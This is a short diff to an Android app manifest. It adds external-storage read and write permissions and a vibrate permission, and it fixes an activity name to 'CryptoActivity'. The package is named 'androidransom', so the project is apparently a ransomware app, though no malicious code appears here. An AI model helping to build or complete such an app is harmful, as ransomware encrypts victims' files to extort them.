@@ -2,6 +2,11 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="bycracks.androidransom">
 
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+
+    <uses-permission android:name="android.permission.VIBRATE"/>
+
     <application
         android:allowBackup="true"
         android:icon="@mipmap/ic_launcher"
@@ -17,7 +22,7 @@
             </intent-filter>
         </activity>
         <activity android:name=".SubActivity"/>
-        <activity android:name=".CryptoAcitivy"/>
+        <activity android:name=".CryptoActivity"/>
     </application>
 
 </manifest>
